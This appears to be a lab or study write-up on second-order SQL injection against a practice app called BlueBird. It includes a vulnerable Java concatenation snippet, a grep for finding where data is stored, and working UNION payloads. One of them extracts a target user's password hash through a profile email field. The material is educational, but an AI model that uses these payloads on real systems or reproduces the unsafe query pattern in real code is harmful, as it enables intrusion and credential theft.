# Second-Order SQL Injection

User input is stored safely (parameterized) but later retrieved from the DB and concatenated into a new SQL query. Storing and triggering are separate requests.

---

## The Vulnerable Pattern (BlueBird /profile/{id})

```java
// Step 1 — safe: parameterized SELECT
sql = "SELECT username, name, description, email, id FROM users WHERE id = ?";
user = jdbcTemplate.queryForObject(sql, new Object[]{id}, ...);

// Step 2 — unsafe: raw concat using DB-fetched email
sql = "SELECT text, to_char(posted_at,...) as posted_at_nice, username, name, author_id " +
      "FROM posts JOIN users ON posts.author_id = users.id " +
      "WHERE email = '" + user.getEmail() + "' ORDER BY posted_at DESC";
```

Even though `email` came from the database, it was never sanitized when originally stored — so injecting at storage time poisons the second query.

---

## Finding the Storage Point

Grep for UPDATE queries that touch the target field:

```bash
grep -irnE 'UPDATE.*email'
# → ProfileController.java: UPDATE users SET name=?, description=?, email=? WHERE id=?
```

The `/profile/edit` endpoint lets you update your own email (parameterized UPDATE — no injection here). This is where you store the payload.

---

## Exploit Flow

1. **Log in** to BlueBird as any user.
2. **Store payload** — POST to `/profile/edit` with email set to your injection:
   ```
   ' UNION SELECT (SELECT password FROM users WHERE username='target'),'2','3','4',5--
   ```
3. **Trigger** — GET `/profile/{your_id}` → the stored email is dropped into the raw concat WHERE clause.
4. The injected UNION row appears in the posts list on the profile page.

---

## Column Types for UNION

The second query selects 5 columns:

| Position | Column | Type |
|----------|--------|------|
| 1 | `text` | VARCHAR |
| 2 | `posted_at_nice` | VARCHAR |
| 3 | `username` | VARCHAR |
| 4 | `name` | VARCHAR |
| 5 | `author_id` | INTEGER |

Working base payload:
```sql
' UNION SELECT '1','2','3','4',5--
```

Extracting a password hash (lands in the `text` column, rendered as post content):
```sql
' UNION SELECT (SELECT password FROM users WHERE username='target'),'2','3','4',5--
```

---

## Key Distinction from Regular SQLi

| | Regular SQLi | Second-Order SQLi |
|---|---|---|
| Injection point | Same request as execution | Different request (store vs. trigger) |
| Storage query | Parameterized (safe) | N/A |
| Execution query | Raw concat | Raw concat with DB-fetched value |
| Detection | Single endpoint scan | Requires tracing data flow across endpoints |

The storage query can be fully parameterized and still enable second-order injection — safety of storage does not imply safety of retrieval.
